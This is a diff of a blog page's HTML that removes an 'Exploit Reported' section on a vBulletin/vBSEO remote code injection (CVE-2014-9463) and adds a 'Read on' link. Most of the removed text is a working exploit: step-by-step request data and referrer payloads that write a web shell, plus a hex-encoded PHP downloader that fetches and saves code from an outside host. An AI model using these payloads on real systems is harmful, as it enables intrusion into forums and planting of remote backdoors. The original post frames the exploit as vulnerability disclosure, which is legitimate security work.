@@ -140,116 +140,12 @@
 <p>We could confirm our thought by analysing the vbseo_modify_template() function which essentially just replaces the specified snippet of code in vBulletin’s template cache.
 So, to inject PHP code, an attacker would have to insert something like this in the referrer field (making it very easy to flag by looking at your HTTP server’s logs):</p>
 
-<h3>Exploit Reported</h3>
-
-
-<figure class='code'><figcaption><span>CVE: 2014-9463</span><a href='http://www.exploit-db.com/exploits/36232/'>Exploit-DB </a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="c1">#################################################################################################################</span>
-</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Exploit</span> <span class="nx">Title</span><span class="o">:</span> <span class="nx">vBulletin</span> <span class="mf">4.</span><span class="nx">x</span><span class="o">.</span><span class="nx">x</span> <span class="s1">&#39;visitormessage.php&#39;</span> <span class="nx">Remote</span> <span class="nx">Code</span> <span class="nx">Injection</span> <span class="nx">Vulnerability</span>
-</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Discovered</span> <span class="nx">By</span><span class="o">:</span> <span class="nx">Dariush</span> <span class="nx">Nasirpour</span> <span class="p">(</span><span class="nx">Net</span><span class="o">.</span><span class="nx">Edit0r</span><span class="p">)</span>
-</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">My</span> <span class="nx">Homepage</span><span class="o">:</span> <span class="nx">black</span><span class="o">-</span><span class="nx">hg</span><span class="o">.</span><span class="nx">org</span> <span class="o">/</span> <span class="nx">nasirpour</span><span class="o">.</span><span class="nx">info</span>
-</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Date</span><span class="o">:</span> <span class="p">[</span><span class="mi">2015</span> <span class="mi">27</span> <span class="nx">February</span><span class="p">]</span>
-</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Vendor</span> <span class="nx">Homepage</span><span class="o">:</span> <span class="nx">vBulletin</span><span class="o">.</span><span class="nx">com</span>
-</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Tested</span> <span class="nx">on</span><span class="o">:</span> <span class="p">(</span><span class="nx">vBulletin</span> <span class="mf">4.2</span><span class="o">.</span><span class="mi">2</span><span class="p">)</span>
-</span><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Greeting</span> <span class="o">:</span> <span class="nx">Ali</span> <span class="nx">Razmjoo</span> <span class="o">-</span> <span class="nx">Ehsan</span> <span class="nx">Nezami</span> <span class="o">-</span> <span class="nx">Arash</span> <span class="nx">Shams</span> <span class="o">-</span> <span class="nx">Ramin</span> <span class="nx">Shahkar</span> <span class="k">and</span> <span class="nx">all</span> <span class="nx">my</span> <span class="nx">freinds</span> <span class="p">(</span> <span class="c1">#bhg )</span>
-</span><span class='line'><span class="c1">#################################################################################################################</span>
-</span><span class='line'><span class="nx">Remote</span> <span class="nx">Code</span> <span class="nx">Injection</span><span class="o">:</span>
-</span><span class='line'><span class="o">+++++++++++++++++++++++++</span>
-</span><span class='line'><span class="mi">1</span><span class="p">)</span> <span class="nx">You</span> <span class="nx">Must</span> <span class="nx">Register</span> <span class="nx">In</span> <span class="nx">The</span> <span class="nx">vBulletin</span> <span class="nx">http</span><span class="o">://</span><span class="nx">server</span><span class="o">/</span><span class="nx">register</span><span class="o">.</span><span class="nx">php</span> <span class="nx">example</span><span class="o">:</span><span class="p">(</span><span class="nx">blackhat</span><span class="p">)</span>
-</span><span class='line'>
-</span><span class='line'><span class="mi">2</span><span class="p">)</span> <span class="nx">go</span> <span class="nx">to</span> <span class="nx">your</span> <span class="nx">user</span> <span class="nx">profile</span> <span class="nx">example</span><span class="o">:</span> <span class="p">(</span><span class="nx">http</span><span class="o">://</span><span class="nx">server</span><span class="o">/</span><span class="nx">members</span><span class="o">/</span><span class="nx">blackhat</span><span class="o">.</span><span class="nx">html</span><span class="p">)</span>
-</span><span class='line'>
-</span><span class='line'><span class="mi">3</span><span class="p">)</span> <span class="nx">post</span> <span class="nx">something</span> <span class="nx">in</span> <span class="nx">visitor</span> <span class="nx">message</span> <span class="k">and</span> <span class="nx">record</span> <span class="nx">post</span> <span class="nx">data</span> <span class="nx">with</span> <span class="nx">live</span> <span class="nx">http</span> <span class="nb">header</span>
-</span><span class='line'>
-</span><span class='line'><span class="p">(</span><span class="nx">example</span><span class="p">)</span> <span class="o">:</span> <span class="nx">message_backup</span><span class="o">=&amp;</span><span class="nx">message</span><span class="o">=</span><span class="k">For</span><span class="o">-</span><span class="nx">Test</span><span class="o">-</span><span class="nx">Sample</span><span class="o">&amp;</span><span class="nx">wysiwyg</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">sbutton</span><span class="o">=%</span><span class="nx">D8</span><span class="o">%</span><span class="nx">A7</span><span class="o">%</span><span class="nx">D8</span><span class="o">%</span><span class="nx">B1</span><span class="o">%</span><span class="nx">D8</span><span class="o">%</span><span class="nx">B3</span><span class="o">%</span><span class="nx">D8</span><span class="o">%</span><span class="nx">A7</span><span class="o">%</span><span class="nx">D9</span><span class="o">%</span><span class="mi">84</span><span class="o">+%</span><span class="nx">D9</span><span class="o">%</span><span class="nx">BE</span><span class="o">%</span><span class="nx">DB</span><span class="o">%</span><span class="mi">8</span><span class="nx">C</span><span class="o">%</span><span class="nx">D8</span><span class="o">%</span><span class="nx">BA</span><span class="o">%</span><span class="nx">D8</span><span class="o">%</span><span class="nx">A7</span><span class="o">%</span><span class="nx">D9</span><span class="o">%</span><span class="mi">85</span><span class="o">&amp;</span><span class="nx">fromquickcomment</span><span class="o">=</span>
-</span><span class='line'><span class="mi">1</span><span class="o">&amp;</span><span class="nx">s</span><span class="o">=&amp;</span><span class="nx">securitytoken</span><span class="o">=</span><span class="mi">1425024074</span><span class="o">-</span><span class="mi">5</span><span class="nx">bcfb5b83d466416ed95e80021abee86063cdf6e</span><span class="o">&amp;</span><span class="k">do</span><span class="o">=</span><span class="nx">message</span><span class="o">&amp;</span><span class="nx">u</span><span class="o">=</span><span class="mi">110</span><span class="o">&amp;</span><span class="nx">u2</span><span class="o">=&amp;</span><span class="nx">loggedinuser</span><span class="o">=</span><span class="mi">110</span><span class="o">&amp;</span><span class="nx">parseurl</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">lastcomment</span><span class="o">=</span><span class="mi">1425022046</span><span class="o">&amp;</span><span class="nx">allow_ajax_qc</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">fromconverse</span><span class="o">=</span>
-</span><span class='line'>
-</span><span class='line'><span class="mi">4</span><span class="o">-</span> <span class="nx">change</span> <span class="nx">message</span> <span class="nx">to</span> <span class="nx">anything</span> <span class="s2">&quot;For-Test-Sample&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;ALEEEEEEEEX&quot;</span>  <span class="p">[</span><span class="nx">because</span> <span class="nx">vBulletin</span> <span class="nx">don</span><span class="err">&#39;</span><span class="nx">t</span> <span class="nx">let</span> <span class="nx">you</span> <span class="nx">send</span> <span class="nx">same</span> <span class="nx">comment</span> <span class="nx">in</span> <span class="nx">a</span> <span class="nb">time</span><span class="p">]</span>
-</span><span class='line'>
-</span><span class='line'><span class="p">[</span><span class="nx">Now</span> <span class="nx">post</span> <span class="k">this</span> <span class="nx">with</span> <span class="nx">hackbar</span><span class="o">:</span><span class="p">]</span>
-</span><span class='line'>
-</span><span class='line'><span class="nx">URL</span><span class="o">:</span>  <span class="nx">http</span><span class="o">://</span><span class="nx">server</span><span class="o">/</span><span class="nx">visitormessage</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="k">do</span><span class="o">=</span><span class="nx">message</span>
-</span><span class='line'>
-</span><span class='line'><span class="p">(</span><span class="nx">Post</span> <span class="nx">data</span><span class="p">)</span>
-</span><span class='line'><span class="nx">message_backup</span><span class="o">=&amp;</span><span class="nx">message</span><span class="o">=</span><span class="nx">ALEEEEEEEEX</span><span class="o">&amp;</span><span class="nx">wysiwyg</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">sbutton</span><span class="o">=%</span><span class="nx">D8</span><span class="o">%</span><span class="nx">A7</span><span class="o">%</span><span class="nx">D8</span><span class="o">%</span><span class="nx">B1</span><span class="o">%</span><span class="nx">D8</span><span class="o">%</span><span class="nx">B3</span><span class="o">%</span><span class="nx">D8</span><span class="o">%</span><span class="nx">A7</span><span class="o">%</span><span class="nx">D9</span><span class="o">%</span><span class="mi">84</span><span class="o">+%</span><span class="nx">D9</span><span class="o">%</span><span class="nx">BE</span><span class="o">%</span><span class="nx">DB</span><span class="o">%</span><span class="mi">8</span><span class="nx">C</span><span class="o">%</span><span class="nx">D8</span><span class="o">%</span><span class="nx">BA</span><span class="o">%</span><span class="nx">D8</span><span class="o">%</span><span class="nx">A7</span><span class="o">%</span><span class="nx">D9</span><span class="o">%</span><span class="mi">85</span><span class="o">&amp;</span><span class="nx">fromquickcomment</span><span class="o">=</span>
-</span><span class='line'><span class="mi">1</span><span class="o">&amp;</span><span class="nx">s</span><span class="o">=&amp;</span><span class="nx">securitytoken</span><span class="o">=</span><span class="mi">1425024074</span><span class="o">-</span><span class="mi">5</span><span class="nx">bcfb5b83d466416ed95e80021abee86063cdf6e</span><span class="o">&amp;</span><span class="k">do</span><span class="o">=</span><span class="nx">message</span><span class="o">&amp;</span><span class="nx">u</span><span class="o">=</span><span class="mi">110</span><span class="o">&amp;</span><span class="nx">u2</span><span class="o">=&amp;</span><span class="nx">loggedinuser</span><span class="o">=</span><span class="mi">110</span><span class="o">&amp;</span><span class="nx">parseurl</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">lastcomment</span><span class="o">=</span><span class="mi">1425022046</span><span class="o">&amp;</span><span class="nx">allow_ajax_qc</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">fromconverse</span><span class="o">=</span>
-</span><span class='line'>
-</span><span class='line'><span class="p">(</span><span class="k">And</span> <span class="nx">referrer</span> <span class="nx">data</span><span class="o">:</span><span class="p">)</span>
-</span><span class='line'><span class="nx">PoC</span> <span class="o">:</span> <span class="nx">http</span><span class="o">://</span><span class="nx">server</span><span class="o">/</span><span class="nx">members</span><span class="o">/</span><span class="nx">blackhat</span><span class="o">.</span><span class="nx">html</span><span class="o">?</span><span class="nx">a</span><span class="o">=</span><span class="nv">$stylevar</span><span class="p">[</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">&quot;shell.php&quot;</span><span class="p">,</span><span class="s2">&quot;hacked&quot;</span><span class="p">)}}]</span>
-</span><span class='line'>
-</span><span class='line'><span class="p">(</span><span class="nx">Example</span> <span class="nx">referrer</span> <span class="nx">data</span><span class="o">:</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">upload</span> <span class="nx">downloader</span><span class="o">.</span><span class="nx">php</span> <span class="k">and</span> <span class="nx">s</span><span class="o">.</span><span class="nx">php</span>
-</span><span class='line'><span class="nx">PoC</span> <span class="o">:</span> <span class="nx">http</span><span class="o">://</span><span class="nx">server</span><span class="o">/</span><span class="nx">members</span><span class="o">/</span><span class="nx">g3n3rall</span><span class="o">.</span><span class="nx">html</span><span class="o">?</span><span class="nx">a</span><span class="o">=</span><span class="nv">$stylevar</span><span class="o">%</span><span class="mi">5</span><span class="nx">b</span><span class="err">$</span><span class="o">%</span><span class="mi">7</span><span class="nx">b</span><span class="err">$</span><span class="o">%</span><span class="mi">7</span><span class="nx">bfile_put_contents</span><span class="p">(</span>
-</span><span class='line'><span class="s2">&quot;downloader.php&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\x3C\x3F\x70\x68\x70\x0D\x0A\x24\x68\x6F\x6D\x65\x70\x61\x67\x65\x20\x3D\x20\x66\x69\x6C\x65\x5F\x67\x65\x74\x5F\x63\x6F\x6E\x74\x65\x6E\x74\x73\x28\x27\x68\x74\x74\x70\x3A\x2F\x2F\x70\x61\x69\x65\x6E\x63\x68\x61\x74\x2E\x63\x6F\x6D\x2F\x64\x2F\x64\x72\x2E\x74\x78\x74\x27\x29\x3B\x0D\x0A\x24\x66\x20\x3D\x20\x66\x6F\x70\x65\x6E\x28\x27\x73\x2E\x70\x68\x70\x27\x2C\x27\x77\x27\x29\x3B\x0D\x0A\x66\x77\x72\x69\x74\x65\x28\x24\x66\x2C\x24\x68\x6F\x6D\x65\x70\x61\x67\x65\x29\x3B\x0D\x0A\x3F\x3E</span><span class="s2">&quot;</span><span class="p">)}}]</span>
-</span><span class='line'>
-</span><span class='line'><span class="mi">5</span><span class="o">-</span> <span class="nx">Open</span> <span class="nx">hackbar</span> <span class="k">and</span> <span class="nx">tamper</span> <span class="nx">it</span> <span class="nx">with</span> <span class="nx">taper</span> <span class="nx">data</span><span class="o">:</span>
-</span><span class='line'><span class="nx">referrer</span> <span class="nx">data</span> <span class="nx">has</span> <span class="nx">been</span> <span class="nx">URL</span> <span class="nx">encoded</span> <span class="nx">by</span> <span class="nx">browser</span> <span class="p">,</span> <span class="nx">you</span> <span class="nx">have</span> <span class="nx">to</span> <span class="nx">replace</span> <span class="k">this</span> <span class="nx">again</span> <span class="nx">with</span> <span class="nx">tamper</span> <span class="nx">data</span><span class="o">:</span> <span class="nx">http</span><span class="o">://</span><span class="nx">server</span><span class="o">/</span><span class="nx">members</span><span class="o">/</span><span class="nx">blackhat</span><span class="o">.</span><span class="nx">html</span><span class="o">?</span><span class="nx">a</span><span class="o">=</span><span class="nv">$stylevar</span><span class="p">[</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">&quot;shell.php&quot;</span><span class="p">,</span><span class="s2">&quot;hacked&quot;</span><span class="p">)}}]</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">and</span> <span class="nx">submit</span> <span class="nx">request</span><span class="o">.</span>
-</span><span class='line'>
-</span><span class='line'><span class="c1">################################################################################################################</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<h3>Video proof:</h3>
-
-
-<div class="embed-video-container"><iframe src="//www.youtube.com/embed/anzgYpKMVHw" allowfullscreen></iframe></div>
-
-
-<p><br></p>
-
-<h3>Screenshot after execute exploit</h3>
-
-
-<p><img src="http://nasirpour.info/file/other/vuln/vul.jpg"></p>
-
-<p>Patch as soon as possible</p>
 </div>
   
+  
+    <footer>
+      <a rel="full-article" href="/blog/vbulletin-vbseo-4-dot-x-x-vulnerability-leads-to-remote-code-execution/">Read on &rarr;</a>
+    </footer>
   
 
 
